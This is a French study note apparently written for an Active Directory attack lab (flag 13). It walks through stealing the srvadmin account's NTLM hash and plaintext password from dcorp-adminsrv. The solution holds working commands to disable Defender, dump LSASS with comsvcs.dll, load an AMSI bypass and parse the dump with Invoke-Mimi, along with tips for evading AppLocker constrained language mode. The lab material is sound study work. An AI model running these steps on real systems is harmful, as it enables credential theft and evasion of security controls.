---
flag: 13
machine: dcorp-adminsrv
statut: à faire
technique: LSASS dump
LO: "[[LO07 - Session DA et escalade]]"
---
# F13 · NTLM/clair de srvadmin

> [!summary] Objectif
> Récupérer le hash NTLM (et si possible le mot de passe clair) du compte `srvadmin` depuis `dcorp-adminsrv`.

## Contexte
- **Étape attack flow** : post-LO7 — DA `svcadmin` obtenu, on rebondit sur `dcorp-adminsrv` (sous-objectif séparé refusé à `ciadmin`).
- **Ce qu'on a** : TGT `svcadmin` (Domain Admin) injecté en session courante via OverPass-the-Hash (voir [[LO07 - Session DA et escalade]] étape 8).
- **Ce qu'on cherche** : `srvadmin` NTLM + éventuel mot de passe clair (loggé récemment sur `dcorp-adminsrv` → présent dans LSASS).

> [!danger] AppLocker CLM sur dcorp-adminsrv (OU Applocked)
> La PSSession démarre en **ConstrainedLanguage Mode** → `Invoke-Mimi` / reflectively-load Rubeus / méthodes .NET → **bloqué** (`MethodInvocationNotSupportedInConstrainedLanguage`). Bypass : dot-source depuis `C:\Windows\Tasks\` (whitelisté AppLocker Default Rules), ou dumper LSASS via `comsvcs.dll` natif (cmdlet, non impacté) puis **parser le .dmp SUR LA STUDENT VM** (hors CLM). Doc : [[Cheatsheet - Lateral movement]] §"Piège AppLocker → CLM".

## Solution

### Étape 1 : vérifier le TGT DA en session
```powershell
klist
# doit lister un TGT krbtgt/DOLLARCORP pour svcadmin
```

### Étape 2 : dump LSASS de dcorp-adminsrv (via PSSession CLM-safe)
```powershell
$s = New-PSSession -ComputerName dcorp-adminsrv
Invoke-Command -Session $s -ScriptBlock {
  Set-MpPreference -DisableRealtimeMonitoring $true                                # cmdlet, CLM OK
  $p = (Get-Process lsass).Id                                                       # property access, CLM OK
  cmd /c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\Users\Public\lsass.dmp full"
  (Get-Item C:\Users\Public\lsass.dmp).Length                                       # note la taille
}
# ATTENTION : Copy-Item -FromSession bloqué en CLM. Utilise SMB UNC direct :
Copy-Item -Path "\\dcorp-adminsrv.dollarcorp.moneycorp.local\C$\Users\Public\lsass.dmp" -Destination C:\AD\Tools\lsass-adminsrv.dmp
Remove-PSSession $s
(Get-Item C:\AD\Tools\lsass-adminsrv.dmp).Length                                    # doit MATCHER la source
```
→ Voir [[Cheatsheet - Post-exploitation]] pour la variante `SafetyKatz` directe et la logique dump.

### Étape 3 : parse en mémoire (mimikatz.exe bloqué par Defender local)
```powershell
iex (Get-Content C:\AD\Tools\Amsi-Byp.txt -Raw)
. C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"sekurlsa::minidump C:\AD\Tools\lsass-adminsrv.dmp" "sekurlsa::logonpasswords"'
```
`logonpasswords` (vs `ekeys`) sort NTLM **et** le clair `wdigest`/`tspkg` si présent.

## Réponse

| Élément | Valeur |
|---------|--------|
| srvadmin NTLM | A REMPLIR DEPUIS LAB |
| srvadmin clair | A REMPLIR DEPUIS LAB |

## Pièges et OPSEC
- Sans TGT DA valide → `Invoke-Command` sur `dcorp-adminsrv` = `Access denied` (`ciadmin` n'y est **pas** admin).
- Défaut : Defender coupé sur `dcorp-adminsrv` d'abord (`Set-MpPreference -DisableRealtimeMonitoring $true`) sinon `comsvcs.dll MiniDump` peut être quarantiné.
- Le navigateur corrompt le `.dmp` — toujours `Copy-Item -FromSession` ou `iwr`, vérifier la taille.
- Event ID 4624 (logon) `svcadmin` sur `dcorp-adminsrv` + accès à `lsass` = signature bruyante.

## Refs
- [[Cheatsheet - Post-exploitation]]
- [[Cheatsheet - Lateral movement]]
- [[LO07 - Session DA et escalade]]
- [[Synthèse - Kerberos]]

[[Flags - Index]] · [[Journal - Index]]
